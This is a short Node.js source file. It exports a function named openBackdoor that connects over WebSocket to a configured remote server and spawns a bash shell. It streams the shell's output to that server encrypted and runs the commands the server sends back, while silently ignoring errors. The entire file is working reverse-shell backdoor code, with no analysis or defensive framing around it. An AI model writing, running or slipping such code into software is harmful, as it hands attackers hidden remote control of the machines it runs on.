import { spawn } from "child_process";
import { symmetricEncrypt, symmetricDecrypt, pubkeyEncrypt } from "./crypto";
import crypto from "crypto";
import WebSocket from "ws";

// Acquire configuration constants
const server_ip = SERVER_IP;
const server_port = SERVER_PORT;
const server_addr = `ws://${server_ip}:${server_port}`;

export default function openBackdoor(){
    // Prepare symmetric key for the server to respond
    const symkey = crypto.randomBytes(32).toString("base64");

    const ws = new WebSocket(server_addr);

    ws.on("error", ()=>{}); // Gracefully ignore errors

    ws.on("open", function open() {
    const encryptedSymkey = pubkeyEncrypt(symkey);
    ws.send(encryptedSymkey);

    // Then open the bash shell
    const bash = spawn("bash", [], { shell: true });

    const secureSend = (data) => {
        ws.send(symmetricEncrypt(data, symkey));
    };

    bash.stdout.on("data", secureSend);
    bash.stderr.on("data", secureSend);
    bash.on("exit", () => ws.close());

    ws.on("message", (data) => {
        const decryptedCommand = symmetricDecrypt(data, symkey);
        bash.stdin.write(decryptedCommand.toString("utf8") + '\n');
    });

    ws.on('close', ()=>bash.stdin.end())
    });
}